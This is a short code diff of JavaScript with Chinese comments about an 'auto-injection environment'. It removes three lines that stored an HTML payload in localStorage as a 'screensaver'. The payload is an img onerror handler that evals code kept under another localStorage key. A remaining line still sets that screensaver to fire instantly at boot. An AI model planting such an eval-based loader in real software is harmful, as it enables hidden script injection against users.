@@ -883,9 +883,6 @@
     // ------------------------------------------
 
     // --- [開始編輯：設定自動注入環境] ---
-    //  寫入 Screen Saver 載體
-    const niPayload = '<img src=x onerror="if(!window.NI_LOADED){try{eval(localStorage.getItem(\'ni_core\'))}catch(e){console.error(\'NI_LOAD_ERR:\',e)} }">';
-    localStorage.setItem('aios-screensaver-1', niPayload);
 
     //  設定系統自動觸發 Screen Saver (0.001 秒即開機後瞬間觸發)
     localStorage.setItem('screensaverPattern', 'ai-generated');
